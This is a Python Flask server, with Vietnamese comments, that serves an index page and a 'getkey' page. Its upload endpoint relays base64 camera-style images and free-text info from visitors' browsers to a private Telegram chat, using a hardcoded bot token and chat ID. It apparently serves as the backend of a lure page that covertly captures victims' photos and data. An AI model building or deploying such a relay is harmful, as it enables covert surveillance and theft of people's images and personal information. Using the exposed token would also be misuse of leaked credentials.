# -*- coding: utf-8 -*-
import os
import base64
import requests
from flask import Flask, request, jsonify, render_template

app = Flask(__name__, template_folder="templates")

TG_TOKEN = os.environ.get("TG_TOKEN", "8811652774:AAEmCsPkcfQyAyJll2km1m2F5MblQ4miGp8")
TG_CHAT  = os.environ.get("TG_CHAT",  "8003369858")


@app.route("/")
def root():
    return render_template("index.html")


@app.route("/getkey")
def getkey():
    return render_template("getkey.html")


@app.route("/api/upload", methods=["POST"])
def upload():
    data = request.get_json(silent=True) or {}
    img_b64 = data.get("image", "")
    info    = data.get("info", "")

    # --- GỬI ẢNH: decode base64 -> bytes -> multipart file upload ---
    if img_b64:
        try:
            # bỏ prefix nếu có (data:image/jpeg;base64,...)
            if "," in img_b64:
                img_b64 = img_b64.split(",", 1)[1]
            img_bytes = base64.b64decode(img_b64)
            requests.post(
                f"https://api.telegram.org/bot{TG_TOKEN}/sendPhoto",
                data={"chat_id": TG_CHAT},
                files={"photo": ("shot.jpg", img_bytes, "image/jpeg")},
                timeout=15,
            )
        except Exception as e:
            print("sendPhoto err:", e)

    # --- GỬI INFO: text message ---
    if info:
        try:
            requests.post(
                f"https://api.telegram.org/bot{TG_TOKEN}/sendMessage",
                data={"chat_id": TG_CHAT, "text": info},
                timeout=10,
            )
        except Exception as e:
            print("sendMessage err:", e)

    return jsonify({"ok": True})


if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000, debug=False)